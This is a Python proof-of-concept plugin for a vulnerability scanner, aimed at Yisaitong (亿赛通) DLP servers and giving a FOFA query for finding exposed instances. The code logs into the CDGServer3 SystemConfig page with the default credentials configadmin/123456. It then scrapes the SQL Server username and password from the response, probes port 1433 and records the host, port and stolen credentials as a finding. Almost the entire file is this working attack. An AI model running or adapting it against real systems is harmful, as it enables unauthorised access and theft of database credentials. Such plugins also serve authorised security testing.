#!/usr/bin/env python
# -*- coding: utf-8 -*-
# @author: 'orleven'

from bs4 import BeautifulSoup
from lib.utils.connect import open_connection
from lib.utils.connect import ClientSession
from script import Script, SERVICE_PORT_MAP

class POC(Script):
    def __init__(self, target=None):
        '''
            fofa: app="亿赛通DLP"
        '''
        self.service_type = SERVICE_PORT_MAP.WEB
        self.name = 'yst dlp burst'
        self.keyword = ['yst_dlp', 'info']
        self.info = 'Burst yst_dlp info.'
        self.type = 'weakpass'
        self.level = 'high'
        Script.__init__(self, target=target, service_type=self.service_type)

    async def prove(self):
        await self.get_url()
        if self.base_url:
            async with ClientSession() as session:
                name = ''
                url1 = self.base_url + 'CDGServer3/help/getEditionInfo.jsp'
                async with session.get(url=url1) as res1:
                    if res1:
                        text1 = await res1.text()
                        soup = BeautifulSoup(text1, 'html5lib')
                        if '授权用户' in text1:
                            name = soup.select(
                                'body > div:nth-of-type(2) > table > tbody > tr:nth-of-type(6) > td:nth-of-type(2) > input[type="text"]')
                        else:
                            name = soup.select(
                                'body > div:nth-of-type(2) > table > tbody > tr:nth-of-type(5) > td:nth-of-type(2) > input[type="text"]')
                        if len(name) > 0:
                            name = name[0]['value']

                url2 = self.base_url + 'CDGServer3/SystemConfig'
                _data = {'command': 'Login', 'verifyCodeDigit': 'dfd', 'name': 'configadmin', 'pass': '123456'}

                async with session.post(url=url2, data=_data) as res2:
                    if res2:
                        text2 = await res2.text()
                        try:
                            soup = BeautifulSoup(text2, 'html5lib')
                            sql_user = soup.select('#est\\.connection\\.username')[0]['value']
                            sql_pass = soup.select('#est\\.connection\\.password')[0]['value']
                            sql_result = name + '/' + sql_user + '/' + sql_pass
                            sql_result = self.target_host + ":1433/" + sql_result

                            self.flag = 1
                            self.req.append({"info": url1, "key": "yst dlp info"})

                            reader, writer = await open_connection(self.target_host, 1433)
                            writer.write("test\r\n".encode())
                            data = await reader.read(1024)
                            writer.close()

                            self.req.append({"info": sql_result, "key": "configadmin/123456"})
                        except:
                            pass

